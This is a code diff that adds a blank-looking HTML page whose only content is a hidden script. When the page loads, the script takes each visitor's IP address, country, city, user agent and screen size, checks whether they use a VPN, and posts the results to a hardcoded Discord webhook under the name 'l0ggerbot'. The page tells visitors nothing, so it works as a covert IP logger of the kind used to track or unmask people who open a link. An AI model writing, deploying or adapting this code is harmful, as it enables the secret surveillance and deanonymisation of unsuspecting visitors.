@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+    <script>
+        function sendWebhook(json, siteUrl, userAgent, isVPN, screenSize) {
+            var request = new XMLHttpRequest();
+
+            request.open("POST", "https://discord.com/api/webhooks/1223627379012931605/MTA-O7C-IN7NSCAfLyYZgYWSqIiz6MION3XtCnWPT2inNODBRMCoxQF8cRJawai58RS2");
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var content = `# IP logged
+📡|**IP Address:** ||${json.ip}|| [WhoIS](https://www.whois.com/) | [Censys](https://censys.io)
+🌎|**Country:** ${json.country}
+:city_dusk:|**City:** ${json.city}
+🤖|**Device:** ${userAgent}
+🖥| **Screen Size:** ${screenSize}
+⏰| **Time:** ${new Date().toLocaleString()}
+🔗|**Site:** ${siteUrl}
+:information_source:| **VPN Detection:** Check [VPN Detection](https://ip.teoh.io/vpn-detection)\n\nMade by @leaked135 (cola) - [Join Discord](https://discord.gg/AwbhBEtz8v)\n`;
+
+            var params = {
+                username: "l0ggerbot",
+                avatar_url: "",
+                content: content
+            };
+
+            request.onreadystatechange = function() {
+                if (request.readyState === XMLHttpRequest.DONE) {
+                    if (request.status === 200) {
+                        console.log('Webhook sent successfully');
+                    } else {
+                        console.error('Failed to send webhook:', request.status);
+                    }
+                }
+            };
+
+            request.send(JSON.stringify(params));
+        }
+
+        function checkVPN(ipInfo) {
+            var ip = ipInfo.ip;
+            var vpnCheckRequest = new XMLHttpRequest();
+            vpnCheckRequest.onreadystatechange = function() {
+                if (vpnCheckRequest.readyState === XMLHttpRequest.DONE) {
+                    if (vpnCheckRequest.status === 200) {
+                        var response = JSON.parse(vpnCheckRequest.responseText);
+                        var isVPN = response.vpn_detected;
+                        var userAgent = navigator.userAgent;
+                        var screenSize = screen.width + "x" + screen.height;
+                        sendWebhook(ipInfo, window.location.href, userAgent, isVPN, screenSize);
+                    } else {
+                        console.error('Failed to check VPN:', vpnCheckRequest.status);
+                        
+                        var userAgent = navigator.userAgent;
+                        var screenSize = screen.width + "x" + screen.height;
+                        sendWebhook(ipInfo, window.location.href, userAgent, false, screenSize);
+                    }
+                }
+            };
+            vpnCheckRequest.open('POST', 'https://ip.teoh.io/vpn-detection', true);
+            vpnCheckRequest.setRequestHeader('Content-type', 'application/json');
+            vpnCheckRequest.send(JSON.stringify({ ip: ip }));
+        }
+
+        var ipinfoRequest = new XMLHttpRequest();
+        ipinfoRequest.onreadystatechange = function() {
+            if (ipinfoRequest.readyState === XMLHttpRequest.DONE) {
+                if (ipinfoRequest.status === 200) {
+                    var ipInfo = JSON.parse(ipinfoRequest.responseText);
+                    checkVPN(ipInfo);
+                } else {
+                    console.error('Failed to fetch IP information:', ipinfoRequest.status);
+                }
+            }
+        };
+        ipinfoRequest.open('GET', 'https://ipinfo.io/json', true);
+        ipinfoRequest.send();
+    </script>
+</body>
+</html>
